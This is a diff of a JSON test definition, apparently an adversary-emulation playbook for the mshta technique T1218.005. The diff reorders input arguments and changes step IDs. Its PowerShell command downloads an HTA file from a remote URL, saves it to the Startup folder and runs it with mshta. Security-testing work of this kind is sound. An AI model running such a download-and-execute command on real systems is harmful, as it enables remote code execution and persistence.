@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "de565049-0435-4cdc-8504-f50df25abca0",
+      "id": "ce86e521-67da-42c4-a232-b36e0e25c376",
       "type": "execute-command",
       "data": {
         "command": "$var =Invoke-WebRequest \"#{hta_url}\"\n$var.content|out-file \"#{temp_file}\"\nmshta \"#{temp_file}\"\nstart-sleep -s 15\nstop-process -name \"calculator\" -Force",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "cb34d986-d20e-41aa-9348-b745cd4d9d25",
+      "id": "060db01e-97fd-4f13-89dd-13bed1dab69b",
       "type": "execute-command",
       "data": {
         "command": "remove-item \"#{temp_file}\" -ErrorAction Ignore",
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "de565049-0435-4cdc-8504-f50df25abca0",
+      "s": "ce86e521-67da-42c4-a232-b36e0e25c376",
       "p": "on-success",
-      "o": "cb34d986-d20e-41aa-9348-b745cd4d9d25"
+      "o": "060db01e-97fd-4f13-89dd-13bed1dab69b"
     },
     {
-      "s": "de565049-0435-4cdc-8504-f50df25abca0",
+      "s": "ce86e521-67da-42c4-a232-b36e0e25c376",
       "p": "on-failure",
-      "o": "cb34d986-d20e-41aa-9348-b745cd4d9d25"
+      "o": "060db01e-97fd-4f13-89dd-13bed1dab69b"
     }
   ],
   "tags": [
@@ -43,16 +43,16 @@
   ],
   "input_arguments": [
     {
-      "name": "temp_file",
-      "type": "string",
-      "description": "temp_file location for hta",
-      "value": "$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta"
-    },
-    {
       "name": "hta_url",
       "type": "string",
       "description": "URL to HTA file for execution",
       "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta"
+    },
+    {
+      "name": "temp_file",
+      "type": "string",
+      "description": "temp_file location for hta",
+      "value": "$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta"
     }
   ]
 }
